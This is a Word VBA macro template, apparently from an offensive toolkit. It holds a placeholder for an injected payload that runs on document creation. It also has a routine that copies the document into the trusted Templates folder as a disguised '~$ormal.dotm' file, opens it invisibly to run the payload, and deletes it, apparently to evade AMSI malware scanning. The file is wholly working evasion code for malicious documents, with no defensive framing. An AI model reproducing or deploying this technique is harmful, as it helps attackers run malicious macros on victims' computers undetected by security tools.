Sub autonew()
    {{vba_payload}}
End Sub

Sub TrustedTemplate_AMSI()
    Dim szCurrentFileFullPathName As String
    Dim szTrustedFilePathName As String
    Dim szTrustedFileFileName As String
    Dim szTrustedFileFullPathName As String
    If InStr(ActiveDocument.AttachedTemplate, "Normal.dotm") <> 0 Then
        szCurrentFileFullPathName = ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name
        szTrustedFileFileName = "~$ormal.dotm"
        szTrustedFilePathName = Environ("appdata") & Application.PathSeparator & "Microsoft" & Application.PathSeparator & "Templates"
        szTrustedFileFullPathName = szTrustedFilePathName & Application.PathSeparator & szTrustedFileFileName
        ActiveDocument.SaveAs2 FileName:=szTrustedFileFullPathName, FileFormat:=wdFormatXMLTemplateMacroEnabled, AddToRecentFiles:=True
        ActiveDocument.SaveAs2 FileName:=szCurrentFileFullPathName, FileFormat:=wdFormatXMLDocumentMacroEnabled
        Documents.Add Template:=szTrustedFileFullPathName, NewTemplate:=False, DocumentType:=wdNewBlankDocument, Visible:=False
        DoEvents
        Kill szTrustedFileFullPathName
        End
    Else
        ActiveDocument.AttachedTemplate = Environ("appdata") & Application.PathSeparator & "Microsoft" & Application.PathSeparator & "Templates" & Application.PathSeparator & "Normal.dotm"
    End If
    
End Sub
